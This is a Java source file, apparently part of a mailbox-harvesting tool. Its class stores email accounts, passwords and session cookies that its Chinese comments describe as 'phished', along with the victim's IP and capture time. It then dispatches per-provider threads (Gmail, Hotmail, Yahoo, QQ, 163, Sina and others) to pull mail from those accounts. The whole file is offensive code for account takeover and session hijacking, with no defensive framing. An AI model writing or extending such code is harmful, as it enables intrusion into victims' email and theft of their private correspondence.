/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package email;


/**
 *
 * @author root
 */
public class BeginReceiveThread  {

        public final int SERVER_HOTMAIL = 1;
        public final int SERVER_FASTMAIL=2;
        public final int SERVER_RUMAIL=3;
        public final int SERVER_126MAIL=4;
        public final int SERVER_YAHOOMAIL=5;
        public final int SERVER_163MAIL=6;
        public final int SERVER_HINETMAIL=7;
        public final int SERVER_GMAIL=8;   
        public final int SERVER_QQMAIL=9;
        public final int SERVER_YEAHMAIL=10;
        public final int SERVER_SINAMAIL=11;

        private int m_ID;							//唯一标示，主键
	private String m_accounts=null;   			//用户输入的邮箱帐户以及钓到的邮箱账户
	private String m_password=null;   			//用户输入的邮箱密码以及钓到的邮箱密码
        private String m_postfix=null;
	private String m_userMessage=null;			//用户备注
	private String m_logo=null; 			        //用户收取邮箱的标示
	private String m_Power=null;       		    //属主
	private int m_Pages;                  		//按页收取字段
	private String m_FirstTime=null; 		        //上次收取时间
	private String m_LastTime=null;	            //最后一次收取时间
	private String m_MailType=null; 	            //邮箱类型
	private int m_MailNumber;			        //已经接收的邮件数量
	private String m_IP=null;  		            //钓到的IP
	private String m_AddTime=null; 	                //钓到的COOKIE及密码的时间
	private int m_AutoRev;			   		    //是否自动收取
	private String m_TimeSpace=null;                  //间隔收取时间
	private String m_DateRevLimit=null;           //按时间收取
	private int m_RevLogo;		 	            //收取次数状态标示
	private int m_RevState; 				    //接收状态


        private String m_url=null;
        private String m_cookie=null;                                                     //cookie信息                                                        //ip
        private String m_browser=null;                                                      //浏览器信息
        private MailFuncInter m_mailFuncInter;
        //初始化密码收邮构造函数
	public BeginReceiveThread(int ID,String accounts,String password,String postfix,String userMessage,String logo,String Power,
			int Pages,String FirstTime,String LastTime,String MailType,int MailNumber,String IP,String AddTime,int AutoRev,
			String TimeSpace,String DateRevLimit,int RevLogo,int RevState, MailFuncInter mailFuncInter )
	{
		m_ID=ID;
		m_accounts=accounts;
		m_password=password;
                m_postfix=postfix;
		m_userMessage=userMessage;
		m_logo=logo;
		m_Power=Power;
		m_Pages=Pages;
		m_FirstTime=FirstTime;
		m_LastTime=LastTime;
		m_MailType=MailType;
		m_MailNumber=MailNumber;
		m_IP=IP;
		m_AddTime=AddTime;
		m_AutoRev=AutoRev;
		m_TimeSpace=TimeSpace;
		m_DateRevLimit=DateRevLimit;
		m_RevLogo=RevLogo;
		m_RevState=RevState;
                m_mailFuncInter = mailFuncInter;
	}
        //初始化cookie收邮够在函数
        public BeginReceiveThread(int ID,String user,String cookie,String url,String ip,
                String date,String Browser,
                int RevLogo,String mailType,MailFuncInter mailInter)
        {
            m_ID=ID;
            m_accounts=user;
            m_cookie=cookie;
            m_IP=ip;
            m_AddTime=date;
            m_browser=Browser;
            m_RevLogo=RevLogo;
            m_MailType=mailType;
            m_mailFuncInter=mailInter;
            m_url=url;
        }
	int i=0;
	public void Execute()
	{
		int ServerType;
		ServerType=GetServType(m_MailType);
		switch(ServerType)
		{
			case SERVER_HOTMAIL:
			{
				HotmailMailRecev hotmailMailRecev=new HotmailMailRecev( m_mailFuncInter );
				hotmailMailRecev.m_ID=m_ID;
				hotmailMailRecev.m_accounts=m_accounts;
                                hotmailMailRecev.m_password=m_password;
                                hotmailMailRecev.m_postfix=m_postfix;
				hotmailMailRecev.m_userMessage=m_userMessage;
				hotmailMailRecev.m_logo=m_logo;
				hotmailMailRecev.m_MailType=m_MailType;
				hotmailMailRecev.m_IP=m_IP;
                                hotmailMailRecev.m_cookie=m_cookie;
				hotmailMailRecev.start();
                                break;
			}
                        case SERVER_FASTMAIL:
                                FastmailMailRecev fastmailMailRecev=new FastmailMailRecev( m_mailFuncInter );
				fastmailMailRecev.m_ID=m_ID;
				fastmailMailRecev.m_accounts=m_accounts;
                                fastmailMailRecev.m_password=m_password;
                                fastmailMailRecev.m_postfix=m_postfix;
				fastmailMailRecev.m_userMessage=m_userMessage;
				fastmailMailRecev.m_logo=m_logo;
				fastmailMailRecev.m_MailType=m_MailType;
				fastmailMailRecev.m_IP=m_IP;
                                fastmailMailRecev.m_cookie=m_cookie;
				fastmailMailRecev.start();
                                break;
                        case SERVER_RUMAIL:
                                RuMailRecev ruMailRecev=new RuMailRecev( m_mailFuncInter );
				ruMailRecev.m_ID=m_ID;
				ruMailRecev.m_accounts=m_accounts;
                                ruMailRecev.m_password=m_password;
                                ruMailRecev.m_postfix=m_postfix;
				ruMailRecev.m_userMessage=m_userMessage;
				ruMailRecev.m_logo=m_logo;
				ruMailRecev.m_MailType=m_MailType;
				ruMailRecev.m_IP=m_IP;
                                ruMailRecev.m_cookie=m_cookie;
				ruMailRecev.start();
                                break;
                        case SERVER_126MAIL:
                                Mail126MailRecev mail126Recev=new Mail126MailRecev( m_mailFuncInter );
				mail126Recev.m_ID=m_ID;
				mail126Recev.m_accounts=m_accounts;
                                mail126Recev.m_password=m_password;
                                mail126Recev.m_postfix=m_postfix;
				mail126Recev.m_userMessage=m_userMessage;
				mail126Recev.m_logo=m_logo;
				mail126Recev.m_MailType=m_MailType;
				mail126Recev.m_IP=m_IP;
                                mail126Recev.m_cookie=m_cookie;
                                mail126Recev.m_url=m_url;
				mail126Recev.start();
                                break;
                         case SERVER_YAHOOMAIL:
                                YahooMailRecev yahooMailRecev=new YahooMailRecev( m_mailFuncInter );
				yahooMailRecev.m_ID=m_ID;
				yahooMailRecev.m_accounts=m_accounts;
                                yahooMailRecev.m_password=m_password;
                                yahooMailRecev.m_postfix=m_postfix;
				yahooMailRecev.m_userMessage=m_userMessage;
				yahooMailRecev.m_logo=m_logo;
				yahooMailRecev.m_MailType=m_MailType;
				yahooMailRecev.m_IP=m_IP;
                                yahooMailRecev.m_cookie=m_cookie;
				yahooMailRecev.start();
                                break;
                          case SERVER_163MAIL:
                                Mail163Mailrecev mail163MailRecev=new Mail163Mailrecev( m_mailFuncInter );
				mail163MailRecev.m_ID=m_ID;
				mail163MailRecev.m_accounts=m_accounts;
                                mail163MailRecev.m_password=m_password;
                                mail163MailRecev.m_postfix=m_postfix;
				mail163MailRecev.m_userMessage=m_userMessage;
				mail163MailRecev.m_logo=m_logo;
				mail163MailRecev.m_MailType=m_MailType;
				mail163MailRecev.m_IP=m_IP;
                                mail163MailRecev.m_cookie=m_cookie;
                                mail163MailRecev.m_url=m_url;
				mail163MailRecev.start();
                                break;
                          case SERVER_HINETMAIL:
                                HiNetMailRecev hinetMailRecev=new HiNetMailRecev( m_mailFuncInter );
				hinetMailRecev.m_ID=m_ID;
				hinetMailRecev.m_accounts=m_accounts;
                                hinetMailRecev.m_password=m_password;
                                hinetMailRecev.m_postfix=m_postfix;
				hinetMailRecev.m_userMessage=m_userMessage;
				hinetMailRecev.m_logo=m_logo;
				hinetMailRecev.m_MailType=m_MailType;
				hinetMailRecev.m_IP=m_IP;
                                hinetMailRecev.m_cookie=m_cookie;
				hinetMailRecev.start();
                                break;
                          case SERVER_GMAIL:
                                MailGmailRecev GMailRecev=new MailGmailRecev( m_mailFuncInter );
				GMailRecev.m_ID=m_ID;
				GMailRecev.m_accounts=m_accounts;
                                GMailRecev.m_password=m_password;
                                GMailRecev.m_postfix=m_postfix;
				GMailRecev.m_userMessage=m_userMessage;
				GMailRecev.m_logo=m_logo;
				GMailRecev.m_MailType=m_MailType;
				GMailRecev.m_IP=m_IP;
                                GMailRecev.m_cookie=m_cookie;
				GMailRecev.start();
                                break;
                           case SERVER_QQMAIL:
                                QQMailRecev QQMailrecev=new QQMailRecev( m_mailFuncInter );
				QQMailrecev.m_ID=m_ID;
				QQMailrecev.m_accounts=m_accounts;
                                QQMailrecev.m_password=m_password;
                                QQMailrecev.m_postfix=m_postfix;
				QQMailrecev.m_userMessage=m_userMessage;
				QQMailrecev.m_logo=m_logo;
				QQMailrecev.m_MailType=m_MailType;
				QQMailrecev.m_IP=m_IP;
                                QQMailrecev.m_cookie=m_cookie;
                                QQMailrecev.m_url=m_url;
				QQMailrecev.start();
                                break;
                            case SERVER_YEAHMAIL:
                                MailYeahMailRecev mailYeahMailrecev=new MailYeahMailRecev( m_mailFuncInter );
				mailYeahMailrecev.m_ID=m_ID;
				mailYeahMailrecev.m_accounts=m_accounts;
                                mailYeahMailrecev.m_password=m_password;
                                mailYeahMailrecev.m_postfix=m_postfix;
				mailYeahMailrecev.m_userMessage=m_userMessage;
				mailYeahMailrecev.m_logo=m_logo;
				mailYeahMailrecev.m_MailType=m_MailType;
				mailYeahMailrecev.m_IP=m_IP;
                                mailYeahMailrecev.m_cookie=m_cookie;
                                mailYeahMailrecev.m_url=m_url;
				mailYeahMailrecev.start();
                                break;
                            case SERVER_SINAMAIL:
                                MailSinaMailRecev mailSinaMailrecev=new MailSinaMailRecev( m_mailFuncInter );
				mailSinaMailrecev.m_ID=m_ID;
				mailSinaMailrecev.m_accounts=m_accounts;
                                mailSinaMailrecev.m_password=m_password;
                                mailSinaMailrecev.m_postfix=m_postfix;
				mailSinaMailrecev.m_userMessage=m_userMessage;
				mailSinaMailrecev.m_logo=m_logo;
				mailSinaMailrecev.m_MailType=m_MailType;
				mailSinaMailrecev.m_IP=m_IP;
                                mailSinaMailrecev.m_cookie=m_cookie;
                                mailSinaMailrecev.m_url=m_url;
				mailSinaMailrecev.start();
                                break;
			default:
				break;


		}
	}
	public int GetServType(String server)
	{
		if((server.trim().indexOf("hotmail"))!=-1)
			return SERVER_HOTMAIL;
                if((server.trim().indexOf("fastmail"))!=-1)
			return SERVER_FASTMAIL;
                if((server.trim().indexOf("ru"))!=-1)
			return SERVER_RUMAIL;
                if((server.trim().indexOf("126"))!=-1)
			return SERVER_126MAIL;
                if((server.trim().indexOf("yahoo"))!=-1)
			return SERVER_YAHOOMAIL;
                if((server.trim().indexOf("163"))!=-1)
			return SERVER_163MAIL;
                if((server.trim().indexOf("hinet"))!=-1)
			return SERVER_HINETMAIL;
                if((server.trim().indexOf("gmail"))!=-1)
			return SERVER_GMAIL;
                if((server.trim().indexOf("qq"))!=-1)
			return SERVER_QQMAIL;
                if((server.trim().indexOf("yeah"))!=-1)
			return SERVER_YEAHMAIL;
		return 0;
	}



}
